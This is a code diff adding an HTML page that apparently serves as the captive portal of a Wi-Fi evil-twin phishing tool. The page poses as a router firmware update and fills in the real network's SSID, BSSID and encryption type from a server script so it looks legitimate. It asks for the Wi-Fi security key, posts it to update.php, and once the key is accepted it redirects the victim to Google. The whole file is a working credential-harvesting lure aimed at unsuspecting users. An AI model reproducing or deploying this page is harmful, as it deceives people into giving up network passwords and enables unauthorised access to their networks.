@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/svg+xml" href="./assets/icons/wifi.svg" />
+    <link rel="stylesheet" type="text/css" href="./assets/framework/bootstrap.min.css?v=5.3.2" />
+    <title>Updates are available for your Internet equipment</title>
+</head>
+
+<body>
+    <main class="container-fluid">
+        <section class="row text-center">
+            <h3 class="my-3">Updates are available for your Internet equipment</h3>
+            <article class="col-12">
+                <h4 class="mb-3">Validate the form below to proceed</h4>
+                <div class="card mb-3 text-bg-light">
+                    <div class="card-header">
+                        <span class="badge text-bg-secondary">Your equipment</span>
+                    </div>
+                    <div class="card-body text-start">
+                        <p class="card-text">
+                            SSID :
+                            <span id="ssid"></span>
+                        </p>
+                        <p class="card-text">
+                            BSSID :
+                            <span id="bssid"></span>
+                        </p>
+                        <p class="card-text">
+                            Encryption :
+                            <span id="encryption"></span>
+                        </p>
+                    </div>
+                </div>
+                <form onsubmit="return false;">
+                    <div class="input-group mb-3">
+                        <span class="input-group-text">
+                            <b>Wi-Fi</b>
+                            &nbsp;
+                            <i>Security Key</i>
+                        </span>
+                        <input type="password" name="password" class="form-control" id="password" placeholder="********"
+                            minlength="8" required="true" />
+                        <object type="image/svg+xml" class="input-group-text" id="reveal"
+                            data="./assets/img/eye.svg"></object>
+                    </div>
+                    <button type="submit" class="btn btn-secondary" id="update-button">
+                        <span id="update-text">Update</span>
+                        <span class="spinner-border text-light d-none" id="update-spinner"></span>
+                    </button>
+                </form>
+            </article>
+        </section>
+    </main>
+
+    <script type="text/javascript">
+        /**
+        * Constants
+        */
+        const PASSWORD = document.querySelector('#password');
+
+        const GET = async (url) => {
+            let response;
+            response = await fetch(url, { method: 'GET' }).catch(function () { });
+            if (response !== undefined) {
+                let data;
+                data = await response.json().catch(function () { });
+                return data;
+            }
+        };
+
+        const POST = async (url, body) => {
+            let response;
+            response = await fetch(
+                url,
+                {
+                    method: 'POST',
+                    body: body,
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            ).catch(function () { });
+            if (response !== undefined) {
+                let data;
+                data = await response.json().catch(function () { });
+                return data;
+            }
+        };
+    </script>
+
+    <script type="text/javascript">
+        /**
+        * Device
+        */
+        GET('./device.php').then(
+            function (json) {
+                if (json !== undefined) {
+                    document.querySelector('#ssid').innerText = json.ssid;
+                    document.querySelector('#bssid').innerText = json.bssid;
+                    document.querySelector('#encryption').innerText = json.encryption;
+                }
+            }
+        );
+    </script>
+
+    <script type="text/javascript">
+        /**
+        * Reveal
+        */
+        const EYES = [
+            './assets/img/eye.svg',
+            './assets/img/eye-slash.svg'
+        ];
+
+        document.querySelector('#reveal').onclick = function () {
+            if (PASSWORD.value) {
+                switch ((this.attributes['data']).value) {
+                    case EYES[0]:
+                        PASSWORD.type = 'text';
+                        this.data = EYES[1];
+                        break;
+                    case EYES[1]:
+                        PASSWORD.type = 'password';
+                        this.data = EYES[0];
+                        break;
+                }
+            }
+        }
+    </script>
+
+    <script type="text/javascript">
+        /**
+        * Update
+        */
+        const UPDATE_BUTTON = document.querySelector('#update-button');
+        const UPDATE_TEXT = document.querySelector('#update-text');
+        const UPDATE_SPINNER = document.querySelector('#update-spinner');
+
+        UPDATE_BUTTON.onclick = function () {
+            let password;
+            password = PASSWORD.value;
+            if (password.length >= 8) {
+                UPDATE_BUTTON.setAttribute('disabled', 'true');
+                UPDATE_TEXT.innerText = null;
+                UPDATE_SPINNER.classList.remove('d-none');
+                POST(
+                    './update.php',
+                    `password=${password}`
+                ).then(
+                    function (json) {
+                        if (json !== undefined) {
+                            if (json.update) {
+                                document.location.href = 'https://www.google.com';
+                            } else {
+                                UPDATE_SPINNER.classList.add('d-none');
+                                UPDATE_TEXT.innerText = 'Retry';
+                                UPDATE_BUTTON.removeAttribute('disabled');
+                            }
+                        }
+                    }
+                );
+            }
+        }
+    </script>
+</body>
+
+</html>
